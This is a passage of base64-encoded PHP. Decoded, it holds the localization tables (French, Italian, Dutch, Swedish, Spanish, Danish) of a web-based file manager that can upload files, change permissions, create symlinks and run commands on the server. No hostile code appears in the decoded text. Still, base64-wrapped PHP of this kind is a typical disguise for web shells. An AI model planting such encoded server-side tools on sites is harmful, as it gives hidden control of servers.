VzJyA9PiAnRD9sYWNlciBjZXMgZmljaGllcnM6JywNCidtb3ZlZCcgPT4gIkNlcyBmaWNoaWVycyBvbnQgPz8gZD9sYWM/IGVuIFwiWyUyXVwiOlxuWyUxXSIsDQonbm90X21vdmVkJyA9PiAiQ2VzIGZpY2hpZXJzIG4gb250IHBhcyBwdSA/cmUgZD9sYWM/IGVuIFwiWyUyXVwiOlxuWyUxXSIsDQonY29weV9maWxlcycgPT4gJ0NvcGllciBjZXMgZmljaGllcnM6JywNCidjb3BpZWQnID0+ICJDZXMgZmljaGllcnMgb250ID8/IGNvcGk/IGVuIFwiWyUyXVwiOlxuWyUxXSIsDQonbm90X2NvcGllZCcgPT4gIkNlcyBmaWNoaWVycyBuIG9udCBwYXMgcHUgP3JlIGNvcGk/IGVuIFwiWyUyXVwiOlxuWyUxXSIsDQonbm90X2VkaXRlZCcgPT4gJyJbJTFdIiBuZSBwZXV0ID9yZSBvdXZlcnQuJywNCidleGVjdXRlZCcgPT4gIlwiWyUxXVwiIGEgPz8gYnJpbGxhbW1lbnQgZXg/dXQ/IDpcbnslMn0iLA0KJ25vdF9leGVjdXRlZCcgPT4gIlwiWyUxXVwiIG4gYSBwYXMgcHUgP3JlIGV4P3V0PzpcbnslMn0iLA0KJ3NhdmVkJyA9PiAnIlslMV0iIGEgPz8gc2F1dmVnYXJkPy4nLA0KJ25vdF9zYXZlZCcgPT4gJyJbJTFdIiBuIGEgcGFzIHB1ID9yZSBzYXV2ZWdhcmQ/LicsDQonc3ltbGlua2VkJyA9PiAnVW4gbGllbiBzeW1ib2xpcXVlIGRlcHVpcyAiWyUyXSIgdmVycyAiWyUxXSIgYSA/PyBjcj8uJywNCidub3Rfc3ltbGlua2VkJyA9PiAnVW4gbGllbiBzeW1ib2xpcXVlIGRlcHVpcyAiWyUyXSIgdmVycyAiWyUxXSIgbiBhIHBhcyBwdSA/cmUgY3I/LicsDQoncGVybWlzc2lvbl9mb3InID0+ICdEcm9pdHMgZGUgIlslMV0iOicsDQoncGVybWlzc2lvbl9zZXQnID0+ICdEcm9pdHMgZGUgIlslMV0iIG9udCA/PyBjaGFuZz8gZW4gWyUyXS4nLA0KJ3Blcm1pc3Npb25fbm90X3NldCcgPT4gJ0Ryb2l0cyBkZSAiWyUxXSIgbiBvbnQgcGFzIHB1ID9yZSBjaGFuZz8gZW5bJTJdLicsDQonbm90X3JlYWRhYmxlJyA9PiAnIlslMV0iIG5lIHBldXQgcGFzID9yZSBvdXZlcnQuJw0KCQkpOw0KDQoJY2FzZSAnaXQnOg0KDQoJCSRkYXRlX2Zvcm1hdCA9ICdkLW0tWSBIOmk6cyc7DQoJCSR3b3JkX2NoYXJzZXQgPSAnSVNPLTg4NTktMSc7DQoNCgkJcmV0dXJuIGFycmF5KA0KJ2RpcmVjdG9yeScgPT4gJ0RpcmVjdG9yeScsDQonZmlsZScgPT4gJ0ZpbGUnLA0KJ2ZpbGVuYW1lJyA9PiAnTm9tZSBGaWxlJywNCg0KJ3NpemUnID0+ICdEaW1lbnNpb25pJywNCidwZXJtaXNzaW9uJyA9PiAnUGVybWVzc2knLA0KJ293bmVyJyA9PiAnUHJvcHJpZXRhcmlvJywNCidncm91cCcgPT4gJ0dydXBwbycsDQonb3RoZXInID0+ICdBbHRybycsDQonZnVuY3Rpb25zJyA9PiAnRnVuemlvbmknLA0KDQoncmVhZCcgPT4gJ2xlZ2dpJywNCid3cml0ZScgPT4gJ3Njcml2aScsDQonZXhlY3V0ZScgPT4gJ2VzZWd1aScsDQoNCidjcmVhdGVfc3ltbGluaycgPT4gJ2NyZWEgbGluayBzaW1ib2xpY28nLA0KJ2RlbGV0ZScgPT4gJ2NhbmNlbGxhJywNCidyZW5hbWUnID0+ICdyaW5vbWluYScsDQonbW92ZScgPT4gJ3Nwb3N0YScsDQonY29weScgPT4gJ2NvcGlhJywNCidlZGl0JyA9PiAnbW9kaWZpY2EnLA0KJ2Rvd25sb2FkJyA9PiAnZG93bmxvYWQnLA0KJ3VwbG9hZCcgPT4gJ3VwbG9hZCcsDQonY3JlYXRlJyA9PiAnY3JlYScsDQonY2hhbmdlJyA9PiAnY2FtYmlhJywNCidzYXZlJyA9PiAnc2FsdmEnLA0KJ3NldCcgPT4gJ2ltcG9zdGEnLA0KJ3Jlc2V0JyA9PiAncmVpbXBvc3RhJywNCidyZWxhdGl2ZScgPT4gJ1BlcmNvcnNvIHJlbGF0aXZvIHBlciBsYSBkZXN0aW5hemlvbmUnLA0KDQoneWVzJyA9PiAnU2knLA0KJ25vJyA9PiAnTm8nLA0KJ2JhY2snID0+ICdpbmRpZXRybycsDQonZGVzdGluYXRpb24nID0+ICdEZXN0aW5hemlvbmUnLA0KJ3N5bWxpbmsnID0+ICdMaW5rIHNpbWJvbGljbycsDQonbm9fb3V0cHV0JyA9PiAnbm8gb3V0cHV0JywNCg0KJ3VzZXInID0+ICdVc2VyJywNCidwYXNzd29yZCcgPT4gJ1Bhc3N3b3JkJywNCidhZGQnID0+ICdhZ2dpdW5naScsDQonYWRkX2Jhc2ljX2F1dGgnID0+ICdhZ2dpdW5naSBhdXRlbnRpY2F6aW9uZSBiYXNlJywNCg0KJ3VwbG9hZGVkJyA9PiAnIlslMV0iID8gc3RhdG8gY2FyaWNhdG8uJywNCidub3RfdXBsb2FkZWQnID0+ICciWyUxXSIgbm9uID8gc3RhdG8gY2FyaWNhdG8uJywNCidhbHJlYWR5X2V4aXN0cycgPT4gJyJbJTFdIiBlc2lzdGUgZ2k/LicsDQonY3JlYXRlZCcgPT4gJyJbJTFdIiA/IHN0YXRvIGNyZWF0by4nLA0KJ25vdF9jcmVhdGVkJyA9PiAnIlslMV0iIG5vbiA/IHN0YXRvIGNyZWF0by4nLA0KJ3JlYWxseV9kZWxldGUnID0+ICdDYW5jZWxsbyBxdWVzdGkgZmlsZSA/JywNCidkZWxldGVkJyA9PiAiUXVlc3RpIGZpbGUgc29ubyBzdGF0aSBjYW5jZWxsYXRpOlxuWyUxXSIsDQonbm90X2RlbGV0ZWQnID0+ICJRdWVzdGkgZmlsZSBub24gcG9zc29ubyBlc3NlcmUgY2FuY2VsbGF0aTpcblslMV0iLA0KJ3JlbmFtZV9maWxlJyA9PiAnRmlsZSByaW5vbWluYXRvOicsDQoncmVuYW1lZCcgPT4gJyJbJTFdIiA/IHN0YXRvIHJpbm9taW5hdG8gaW4gIlslMl0iLicsDQonbm90X3JlbmFtZWQnID0+ICciWyUxXSBub24gPyBzdGF0byByaW5vbWluYXRvIGluICJbJTJdIi4nLA0KJ21vdmVfZmlsZXMnID0+ICdTcG9zdG8gcXVlc3RpIGZpbGU6JywNCidtb3ZlZCcgPT4gIlF1ZXN0aSBmaWxlIHNvbm8gc3RhdGkgc3Bvc3RhdGkgaW4gXCJbJTJdXCI6XG5bJTFdIiwNCidub3RfbW92ZWQnID0+ICJRdWVzdGkgZmlsZSBub24gcG9zc29ubyBlc3NlcmUgc3Bvc3RhdGkgaW4gXCJbJTJdXCI6XG5bJTFdIiwNCidjb3B5X2ZpbGVzJyA9PiAnQ29waW8gcXVlc3RpIGZpbGUnLA0KJ2NvcGllZCcgPT4gIlF1ZXN0aSBmaWxlIHNvbm8gc3RhdGkgY29waWF0aSBpbiBcIlslMl1cIjpcblslMV0iLA0KJ25vdF9jb3BpZWQnID0+ICJRdWVzdGkgZmlsZSBub24gcG9zc29ubyBlc3NlcmUgY29waWF0aSBpbiBcIlslMl1cIjpcblslMV0iLA0KJ25vdF9lZGl0ZWQnID0+ICciWyUxXSIgbm9uIHB1PyBlc3NlcmUgbW9kaWZpY2F0by4nLA0KJ2V4ZWN1dGVkJyA9PiAiXCJbJTFdXCIgPyBzdGF0byBlc2VndWl0byBjb24gc3VjY2Vzc286XG57JTJ9IiwNCidub3RfZXhlY3V0ZWQnID0+ICJcIlslMV1cIiBub24gPyBzdGF0byBlc2VndWl0byBjb24gc3VjY2Vzc29cbnslMn0iLA0KJ3NhdmVkJyA9PiAnIlslMV0iID8gc3RhdG8gc2FsdmF0by4nLA0KJ25vdF9zYXZlZCcgPT4gJyJbJTFdIiBub24gPyBzdGF0byBzYWx2YXRvLicsDQonc3ltbGlua2VkJyA9PiAnSWwgbGluayBzaWFtYm9saWNvIGRhICJbJTJdIiBhICJbJTFdIiA/IHN0YXRvIGNyZWF0by4nLA0KJ25vdF9zeW1saW5rZWQnID0+ICdJbCBsaW5rIHNpYW1ib2xpY28gZGEgIlslMl0iIGEgIlslMV0iIG5vbiA/IHN0YXRvIGNyZWF0by4nLA0KJ3Blcm1pc3Npb25fZm9yJyA9PiAnUGVybWVzc2kgZGkgIlslMV0iOicsDQoncGVybWlzc2lvbl9zZXQnID0+ICdJIHBlcm1lc3NpIGRpICJbJTFdIiBzb25vIHN0YXRpIGltcG9zdGF0aSBbJTJdLicsDQoncGVybWlzc2lvbl9ub3Rfc2V0JyA9PiAnSSBwZXJtZXNzaSBkaSAiWyUxXSIgbm9uIHNvbm8gc3RhdGkgaW1wb3N0YXRpIFslMl0uJywNCidub3RfcmVhZGFibGUnID0+ICciWyUxXSIgbm9uIHB1PyBlc3NlcmUgbGV0dG8uJw0KCQkpOw0KDQoJY2FzZSAnbmwnOg0KDQoJCSRkYXRlX2Zvcm1hdCA9ICduL2oveSBIOmk6cyc7DQoJCSR3b3JkX2NoYXJzZXQgPSAnSVNPLTg4NTktMSc7DQoNCgkJcmV0dXJuIGFycmF5KA0KJ2RpcmVjdG9yeScgPT4gJ0RpcmVjdG9yeScsDQonZmlsZScgPT4gJ0Jlc3RhbmQnLA0KJ2ZpbGVuYW1lJyA9PiAnQmVzdGFuZHNuYWFtJywNCg0KJ3NpemUnID0+ICdHcm9vdHRlJywNCidwZXJtaXNzaW9uJyA9PiAnQmV2b2VnZGhlaWQnLA0KJ293bmVyJyA9PiAnRWlnZW5hYXInLA0KJ2dyb3VwJyA9PiAnR3JvZXAnLA0KJ290aGVyJyA9PiAnQW5kZXJlbicsDQonZnVuY3Rpb25zJyA9PiAnRnVuY3RpZXMnLA0KDQoncmVhZCcgPT4gJ2xlemVuJywNCid3cml0ZScgPT4gJ3NjaHJpanZlbicsDQonZXhlY3V0ZScgPT4gJ3VpdHZvZXJlbicsDQoNCidjcmVhdGVfc3ltbGluaycgPT4gJ21hYWsgc3ltbGluaycsDQonZGVsZXRlJyA9PiAndmVyd2lqZGVyZW4nLA0KJ3JlbmFtZScgPT4gJ2hlcm5vZW1lbicsDQonbW92ZScgPT4gJ3ZlcnBsYWF0c2VuJywNCidjb3B5JyA9PiAna29waWVyZW4nLA0KJ2VkaXQnID0+ICdiZXdlcmtlbicsDQonZG93bmxvYWQnID0+ICdkb3dubG9hZGVuJywNCid1cGxvYWQnID0+ICd1cGxvYWRlbicsDQonY3JlYXRlJyA9PiAnYWFubWFrZW4nLA0KJ2NoYW5nZScgPT4gJ3ZlcmFuZGVyZW4nLA0KJ3NhdmUnID0+ICdvcHNsYWFuJywNCidzZXQnID0+ICdpbnN0ZWxsZW4nLA0KJ3Jlc2V0JyA9PiAncmVzZXR0ZW4nLA0KJ3JlbGF0aXZlJyA9PiAnUmVsYXRpZWYgcGF0IG5hYXIgZG9lbCcsDQoNCid5ZXMnID0+ICdKYScsDQonbm8nID0+ICdOZWUnLA0KJ2JhY2snID0+ICd0ZXJ1ZycsDQonZGVzdGluYXRpb24nID0+ICdCZXN0ZW1taW5nJywNCidzeW1saW5rJyA9PiAnU3ltbGluaycsDQonbm9fb3V0cHV0JyA9PiAnZ2VlbiBvdXRwdXQnLA0KDQondXNlcicgPT4gJ0dlYnJ1aWtlcicsDQoncGFzc3dvcmQnID0+ICdXYWNodHdvb3JkJywNCidhZGQnID0+ICd0b2V2b2VnZW4nLA0KJ2FkZF9iYXNpY19hdXRoJyA9PiAnYWRkIGJhc2ljLWF1dGhlbnRpZmljYXRpb24nLA0KDQondXBsb2FkZWQnID0+ICciWyUxXSIgaXMgdmVyc3R1dXJkLicsDQonbm90X3VwbG9hZGVkJyA9PiAnIlslMV0iIGthbiBuaWV0IHdvcmRlbiB2ZXJzdHV1cmQuJywNCidhbHJlYWR5X2V4aXN0cycgPT4gJyJbJTFdIiBiZXN0YWF0IGFsLicsDQonY3JlYXRlZCcgPT4gJyJbJTFdIiBpcyBhYW5nZW1hYWt0LicsDQonbm90X2NyZWF0ZWQnID0+ICciWyUxXSIga2FuIG5pZXQgd29yZGVuIGFhbmdlbWFha3QuJywNCidyZWFsbHlfZGVsZXRlJyA9PiAnRGV6ZSBiZXN0YW5kZW4gdmVyd2lqZGVyZW4/JywNCidkZWxldGVkJyA9PiAiRGV6ZSBiZXN0YW5kZW4gemlqbiB2ZXJ3aWpkZXJkOlxuWyUxXSIsDQonbm90X2RlbGV0ZWQnID0+ICJEZXplIGJlc3RhbmRlbiBrb25kZW4gbmlldCB3b3JkZW4gdmVyd2lqZGVyZDpcblslMV0iLA0KJ3JlbmFtZV9maWxlJyA9PiAnQmVzdGFuZHNuYWFtIHZlcmFuZGVyZW46JywNCidyZW5hbWVkJyA9PiAnIlslMV0iIGhlZXQgbnUgIlslMl0iLicsDQonbm90X3JlbmFtZWQnID0+ICciWyUxXSBrb24gbmlldCB3b3JkZW4gdmVyYW5kZXJkIGluICJbJTJdIi4nLA0KJ21vdmVfZmlsZXMnID0+ICdWZXJwbGFhdHMgZGV6ZSBiZXN0YW5kZW46JywNCidtb3ZlZCcgPT4gIkRlemUgYmVzdGFuZGVuIHppam4gdmVycGxhYXRzdCBuYWFyIFwiWyUyXVwiOlxuWyUxXSIsDQonbm90X21vdmVkJyA9PiAiS2FuIGRlemUgYmVzdGFuZGVuIG5pZXQgdmVycGxhYXRzZW4gbmFhciBcIlslMl1cIjpcblslMV0iLA0KJ2NvcHlfZmlsZXMnID0+ICdLb3BpZWVyIGRlemUgYmVzdGFuZGVuOicsDQonY29waWVkJyA9PiAiRGV6ZSBiZXN0YW5kZW4gemlqbiBnZWtvcGllZXJkIG5hYXIgXCJbJTJdXCI6XG5bJTFdIiwNCidub3RfY29waWVkJyA9PiAiRGV6ZSBiZXN0YW5kZW4ga3VubmVuIG5pZXQgd29yZGVuIGdla29waWVlcmQgbmFhciBcIlslMl1cIjpcblslMV0iLA0KJ25vdF9lZGl0ZWQnID0+ICciWyUxXSIga2FuIG5pZXQgd29yZGVuIGJld2Vya3QuJywNCidleGVjdXRlZCcgPT4gIlwiWyUxXVwiIGlzIG1ldCBzdWNjZXMgdWl0Z2V2b2VyZDpcbnslMn0iLA0KJ25vdF9leGVjdXRlZCcgPT4gIlwiWyUxXVwiIGlzIG5pZXQgZ29lZCB1aXRnZXZvZXJkOlxueyUyfSIsDQonc2F2ZWQnID0+ICciWyUxXSIgaXMgb3BnZXNsYWdlbi4nLA0KJ25vdF9zYXZlZCcgPT4gJyJbJTFdIiBpcyBuaWV0IG9wZ2VzbGFnZW4uJywNCidzeW1saW5rZWQnID0+ICdTeW1saW5rIHZhbiAiWyUyXSIgbmFhciAiWyUxXSIgaXMgYWFuZ2VtYWFrdC4nLA0KJ25vdF9zeW1saW5rZWQnID0+ICdTeW1saW5rIHZhbiAiWyUyXSIgbmFhciAiWyUxXSIgaXMgbmlldCBhYW5nZW1hYWt0LicsDQoncGVybWlzc2lvbl9mb3InID0+ICdCZXZvZWdkaGVpZCB2b29yICJbJTFdIjonLA0KJ3Blcm1pc3Npb25fc2V0JyA9PiAnQmV2b2VnZGhlaWQgdmFuICJbJTFdIiBpcyBpbmdlc3RlbGQgb3AgWyUyXS4nLA0KJ3Blcm1pc3Npb25fbm90X3NldCcgPT4gJ0Jldm9lZ2RoZWlkIHZhbiAiWyUxXSIgaXMgbmlldCBpbmdlc3RlbGQgb3AgWyUyXS4nLA0KJ25vdF9yZWFkYWJsZScgPT4gJyJbJTFdIiBrYW4gbmlldCB3b3JkZW4gZ2VsZXplbi4nDQoJCSk7DQoNCgljYXNlICdzZSc6DQoNCgkJJGRhdGVfZm9ybWF0ID0gJ24vai95IEg6aTpzJzsNCgkJJHdvcmRfY2hhcnNldCA9ICdJU08tODg1OS0xJzsNCg0KCQlyZXR1cm4gYXJyYXkoDQonZGlyZWN0b3J5JyA9PiAnTWFwcCcsDQonZmlsZScgPT4gJ0ZpbCcsDQonZmlsZW5hbWUnID0+ICdGaWxuYW1uJywNCg0KJ3NpemUnID0+ICdTdG9ybGVrJywNCidwZXJtaXNzaW9uJyA9PiAnUz9rZXJoZXRzbml2PycsDQonb3duZXInID0+ICc/Z2FyZScsDQonZ3JvdXAnID0+ICdHcnVwcCcsDQonb3RoZXInID0+ICdBbmRyYScsDQonZnVuY3Rpb25zJyA9PiAnRnVua3Rpb25lcicsDQoNCidyZWFkJyA9PiAnTD9zJywNCid3cml0ZScgPT4gJ1Nrcml2JywNCidleGVjdXRlJyA9PiAnVXRmP3InLA0KDQonY3JlYXRlX3N5bWxpbmsnID0+ICdTa2FwYSBzeW1saW5rJywNCidkZWxldGUnID0+ICdSYWRlcmEnLA0KJ3JlbmFtZScgPT4gJ0J5dCBuYW1uJywNCidtb3ZlJyA9PiAnRmx5dHRhJywNCidjb3B5JyA9PiAnS29waWVyYScsDQonZWRpdCcgPT4gJz9uZHJhJywNCidkb3dubG9hZCcgPT4gJ0xhZGRhIG5lcicsDQondXBsb2FkJyA9PiAnTGFkZGEgdXBwJywNCidjcmVhdGUnID0+ICdTa2FwYScsDQonY2hhbmdlJyA9PiAnP25kcmEnLA0KJ3NhdmUnID0+ICdTcGFyYScsDQonc2V0JyA9PiAnTWFya2VyYScsDQoncmVzZXQnID0+ICdUP20nLA0KJ3JlbGF0aXZlJyA9PiAnUmVsYXRpdmUgcGF0aCB0byB0YXJnZXQnLA0KDQoneWVzJyA9PiAnSmEnLA0KJ25vJyA9PiAnTmVqJywNCidiYWNrJyA9PiAnVGlsbGJha3MnLA0KJ2Rlc3RpbmF0aW9uJyA9PiAnRGVzdGluYXRpb24nLA0KJ3N5bWxpbmsnID0+ICdTeW1saW5rJywNCidub19vdXRwdXQnID0+ICdubyBvdXRwdXQnLA0KDQondXNlcicgPT4gJ0Fudj9uZGFyZScsDQoncGFzc3dvcmQnID0+ICdMP3Nlbm9yZCcsDQonYWRkJyA9PiAnTD9nZyB0aWxsJywNCidhZGRfYmFzaWNfYXV0aCcgPT4gJ2FkZCBiYXNpYy1hdXRoZW50aWZpY2F0aW9uJywNCg0KJ3VwbG9hZGVkJyA9PiAnIlslMV0iIGhhciBsYWRkYXRzIHVwcC4nLA0KJ25vdF91cGxvYWRlZCcgPT4gJyJbJTFdIiBrdW5kZSBpbnRlIGxhZGRhcyB1cHAuJywNCidhbHJlYWR5X2V4aXN0cycgPT4gJyJbJTFdIiBmaW5ucyByZWRhbi4nLA0KJ2NyZWF0ZWQnID0+ICciWyUxXSIgaGFyIHNrYXBhdHMuJywNCidub3RfY3JlYXRlZCcgPT4gJyJbJTFdIiBrdW5kZSBpbnRlIHNrYXBhcy4nLA0KJ3JlYWxseV9kZWxldGUnID0+ICdSYWRlcmEgZGVzc2EgZmlsZXI/JywNCidkZWxldGVkJyA9PiAiRGUgaD9yIGZpbGVybmEgaGFyIHJhZGVyYXRzOlxuWyUxXSIsDQonbm90X2RlbGV0ZWQnID0+ICJEZXNzYSBmaWxlciBrdW5kZSBpbnRlIHJhZGVyYXM6XG5bJTFdIiwNCidyZW5hbWVfZmlsZScgPT4gJ0J5dCBuYW1uIHA/IGZpbDonLA0KJ3JlbmFtZWQnID0+ICciWyUxXSIgaGFyIGJ5dHQgbmFtbiB0aWxsICJbJTJdIi4nLA0KJ25vdF9yZW5hbWVkJyA9PiAnIlslMV0ga3VuZGUgaW50ZSBkP3BhcyBvbSB0aWxsICJbJTJdIi4nLA0KJ21vdmVfZmlsZXMnID0+ICdGbHl0dGEgZGVzc2EgZmlsZXI6JywNCidtb3ZlZCcgPT4gIkRlc3NhIGZpbGVyIGhhciBmbHl0dGF0cyB0aWxsIFwiWyUyXVwiOlxuWyUxXSIsDQonbm90X21vdmVkJyA9PiAiRGVzc2EgZmlsZXIga3VuZGUgaW50ZSBmbHl0dGFzIHRpbGwgXCJbJTJdXCI6XG5bJTFdIiwNCidjb3B5X2ZpbGVzJyA9PiAnS29waWVyYSBkZXNzYSBmaWxlcjonLA0KJ2NvcGllZCcgPT4gIkRlc3NhIGZpbGVyIGhhciBrb3BpZXJhdHMgdGlsbCBcIlslMl1cIjpcblslMV0iLA0KJ25vdF9jb3BpZWQnID0+ICJEZXNzYSBmaWxlciBrdW5kZSBpbnRlIGtvcGllcmFzIHRpbGwgXCJbJTJdXCI6XG5bJTFdIiwNCidub3RfZWRpdGVkJyA9PiAnIlslMV0iIGthbiBpbnRlID9uZHJhcy4nLA0KJ2V4ZWN1dGVkJyA9PiAiXCJbJTFdXCIgaGFyIHV0Zj9ydHM6XG57JTJ9IiwNCidub3RfZXhlY3V0ZWQnID0+ICJcIlslMV1cIiBrdW5kZSBpbnRlIHV0Zj9yYXM6XG57JTJ9IiwNCidzYXZlZCcgPT4gJyJbJTFdIiBoYXIgc3BhcmF0cy4nLA0KJ25vdF9zYXZlZCcgPT4gJyJbJTFdIiBrdW5kZSBpbnRlIHNwYXJhcy4nLA0KJ3N5bWxpbmtlZCcgPT4gJ1N5bWxpbmsgZnI/biAiWyUyXSIgdGlsbCAiWyUxXSIgaGFyIHNrYXBhdHMuJywNCidub3Rfc3ltbGlua2VkJyA9PiAnU3ltbGluayBmcj9uICJbJTJdIiB0aWxsICJbJTFdIiBrdW5kZSBpbnRlIHNrYXBhcy4nLA0KJ3Blcm1pc3Npb25fZm9yJyA9PiAnUj90dGlnaGV0ZXIgZj9yICJbJTFdIjonLA0KJ3Blcm1pc3Npb25fc2V0JyA9PiAnUj90dGlnaGV0ZXIgZj9yICJbJTFdIiA/bmRyYWRlcyB0aWxsIFslMl0uJywNCidwZXJtaXNzaW9uX25vdF9zZXQnID0+ICdQZXJtaXNzaW9uIG9mICJbJTFdIiBjb3VsZCBub3QgYmUgc2V0IHRvIFslMl0uJywNCidub3RfcmVhZGFibGUnID0+ICciWyUxXSIga2FuIGludGUgbD9zYXMuJw0KCQkpOw0KDQoJY2FzZSAnc3AnOg0KDQoJCSRkYXRlX2Zvcm1hdCA9ICdqL24veSBIOmk6cyc7DQoJCSR3b3JkX2NoYXJzZXQgPSAnSVNPLTg4NTktMSc7DQoNCgkJcmV0dXJuIGFycmF5KA0KJ2RpcmVjdG9yeScgPT4gJ0RpcmVjdG9yaW8nLA0KJ2ZpbGUnID0+ICdBcmNoaXZvJywNCidmaWxlbmFtZScgPT4gJ05vbWJyZSBBcmNoaXZvJywNCg0KJ3NpemUnID0+ICdUYW1hP28nLA0KJ3Blcm1pc3Npb24nID0+ICdQZXJtaXNvcycsDQonb3duZXInID0+ICdQcm9waWV0YXJpbycsDQonZ3JvdXAnID0+ICdHcnVwbycsDQonb3RoZXInID0+ICdPdHJvcycsDQonZnVuY3Rpb25zJyA9PiAnRnVuY2lvbmVzJywNCg0KJ3JlYWQnID0+ICdsZWN0dXJhJywNCid3cml0ZScgPT4gJ2VzY3JpdHVyYScsDQonZXhlY3V0ZScgPT4gJ2VqZWN1Y2k/bicsDQoNCidjcmVhdGVfc3ltbGluaycgPT4gJ2NyZWFyIGVubGFjZScsDQonZGVsZXRlJyA9PiAnYm9ycmFyJywNCidyZW5hbWUnID0+ICdyZW5vbWJyYXInLA0KJ21vdmUnID0+ICdtb3ZlcicsDQonY29weScgPT4gJ2NvcGlhcicsDQonZWRpdCcgPT4gJ2VkaXRhcicsDQonZG93bmxvYWQnID0+ICdiYWphcicsDQondXBsb2FkJyA9PiAnc3ViaXInLA0KJ2NyZWF0ZScgPT4gJ2NyZWFyJywNCidjaGFuZ2UnID0+ICdjYW1iaWFyJywNCidzYXZlJyA9PiAnc2FsdmFyJywNCidzZXQnID0+ICdzZXRlYXInLA0KJ3Jlc2V0JyA9PiAncmVzZXRlYXInLA0KJ3JlbGF0aXZlJyA9PiAnUGF0aCByZWxhdGl2bycsDQoNCid5ZXMnID0+ICdTaScsDQonbm8nID0+ICdObycsDQonYmFjaycgPT4gJ2F0cj9zJywNCidkZXN0aW5hdGlvbicgPT4gJ0Rlc3Rpbm8nLA0KJ3N5bWxpbmsnID0+ICdFbmxhY2UnLA0KJ25vX291dHB1dCcgPT4gJ3NpbiBzYWxpZGEnLA0KDQondXNlcicgPT4gJ1VzdWFyaW8nLA0KJ3Bhc3N3b3JkJyA9PiAnQ2xhdmUnLA0KJ2FkZCcgPT4gJ2FncmVnYXInLA0KJ2FkZF9iYXNpY19hdXRoJyA9PiAnYWdyZWdhciBhdXRlbnRpZmljYWNpP24gYj9zaWNhJywNCg0KJ3VwbG9hZGVkJyA9PiAnIlslMV0iIGhhIHNpZG8gc3ViaWRvLicsDQonbm90X3VwbG9hZGVkJyA9PiAnIlslMV0iIG5vIHB1ZG8gc2VyIHN1Ymlkby4nLA0KJ2FscmVhZHlfZXhpc3RzJyA9PiAnIlslMV0iIHlhIGV4aXN0ZS4nLA0KJ2NyZWF0ZWQnID0+ICciWyUxXSIgaGEgc2lkbyBjcmVhZG8uJywNCidub3RfY3JlYXRlZCcgPT4gJyJbJTFdIiBubyBwdWRvIHNlciBjcmVhZG8uJywNCidyZWFsbHlfZGVsZXRlJyA9PiAnP0JvcnJhIGVzdG9zIGFyY2hpdm9zPycsDQonZGVsZXRlZCcgPT4gIkVzdG9zIGFyY2hpdm9zIGhhbiBzaWRvIGJvcnJhZG9zOlxuWyUxXSIsDQonbm90X2RlbGV0ZWQnID0+ICJFc3RvcyBhcmNoaXZvcyBubyBwdWRpZXJvbiBzZXIgYm9ycmFkb3M6XG5bJTFdIiwNCidyZW5hbWVfZmlsZScgPT4gJ1Jlbm9tYnJhIGFyY2hpdm86JywNCidyZW5hbWVkJyA9PiAnIlslMV0iIGhhIHNpZG8gcmVub21icmFkbyBhICJbJTJdIi4nLA0KJ25vdF9yZW5hbWVkJyA9PiAnIlslMV0gbm8gcHVkbyBzZXIgcmVub21icmFkbyBhICJbJTJdIi4nLA0KJ21vdmVfZmlsZXMnID0+ICdNb3ZlciBlc3RvcyBhcmNoaXZvczonLA0KJ21vdmVkJyA9PiAiRXN0b3MgYXJjaGl2b3MgaGFuIHNpZG8gbW92aWRvcyBhIFwiWyUyXVwiOlxuWyUxXSIsDQonbm90X21vdmVkJyA9PiAiRXN0b3MgYXJjaGl2b3Mgbm8gcHVkaWVyb24gc2VyIG1vdmlkb3MgYSBcIlslMl1cIjpcblslMV0iLA0KJ2NvcHlfZmlsZXMnID0+ICdDb3BpYXIgZXN0b3MgYXJjaGl2b3M6JywNCidjb3BpZWQnID0+ICJFc3RvcyBhcmNoaXZvcyBoYW4gc2lkbyBjb3BpYWRvcyBhICBcIlslMl1cIjpcblslMV0iLA0KJ25vdF9jb3BpZWQnID0+ICJFc3RvcyBhcmNoaXZvcyBubyBwdWRpZXJvbiBzZXIgY29waWFkb3MgXCJbJTJdXCI6XG5bJTFdIiwNCidub3RfZWRpdGVkJyA9PiAnIlslMV0iIG5vIHB1ZG8gc2VyIGVkaXRhZG8uJywNCidleGVjdXRlZCcgPT4gIlwiWyUxXVwiIGhhIHNpZG8gZWplY3V0YWRvIGNvcnJlY3RhbWVudGU6XG57JTJ9IiwNCidub3RfZXhlY3V0ZWQnID0+ICJcIlslMV1cIiBubyBwdWRvIHNlciBlamVjdXRhZG8gY29ycmVjdGFtZW50ZTpcbnslMn0iLA0KJ3NhdmVkJyA9PiAnIlslMV0iIGhhIHNpZG8gc2FsdmFkby4nLA0KJ25vdF9zYXZlZCcgPT4gJyJbJTFdIiBubyBwdWRvIHNlciBzYWx2YWRvLicsDQonc3ltbGlua2VkJyA9PiAnRW5sYWNlIGRlc2RlICJbJTJdIiBhICJbJTFdIiBoYSBzaWRvIGNyZWFkby4nLA0KJ25vdF9zeW1saW5rZWQnID0+ICdFbmxhY2UgZGVzZGUgIlslMl0iIGEgIlslMV0iIG5vIHB1ZG8gc2VyIGNyZWFkby4nLA0KJ3Blcm1pc3Npb25fZm9yJyA9PiAnUGVybWlzb3MgZGUgIlslMV0iOicsDQoncGVybWlzc2lvbl9zZXQnID0+ICdQZXJtaXNvcyBkZSAiWyUxXSIgZnVlcm9uIHNldGVhZG9zIGEgWyUyXS4nLA0KJ3Blcm1pc3Npb25fbm90X3NldCcgPT4gJ1Blcm1pc29zIGRlICJbJTFdIiBubyBwdWRvIHNlciBzZXRlYWRvIGEgWyUyXS4nLA0KJ25vdF9yZWFkYWJsZScgPT4gJyJbJTFdIiBubyBwdWRvIHNlciBsZT9kby4nDQoJCSk7DQoNCgljYXNlICdkayc6DQoNCgkJJGRhdGVfZm9ybWF0ID0gJ24vai95IEg6aTpzJzsNCgkJJHdvcmRfY2hhcnNldCA9ICdJU08tODg1OS0xJzsNCg0KCQlyZXR1cm4gYXJyYXkoDQonZGlyZWN0b3J5JyA9PiAnTWFwcGUnLA0KJ2ZpbGUnID0+ICdGaWwnLA0KJ2ZpbGVuYW1lJyA9PiAnRmlsbmF2bicsDQoNCidzaXplJyA9PiAnU3Q/cnJlbHNlJywNCidwZXJtaXNzaW9uJyA9PiAnUmV0dGlnaGVkJywNCidvd25lcicgPT4gJ0VqZXInLA0KJ2dyb3VwJyA9PiAnR3J1cHBlJywNCidvdGhlcicgPT4gJ0FuZHJlJywNCidmdW5jdGlvbnMnID0+ICdGdW5rdGlvbmVyJywNCg0KJ3JlYWQnID0+ICdsP3MnLA0KJ3dyaXRlJyA9PiAnc2tyaXYnLA0KJ2V4ZWN1dGUnID0+ICdrP3InLA0KDQonY3JlYXRlX3N5bWxpbmsnID0+ICdvcHJldCBzeW1ib2xzayBsaW5r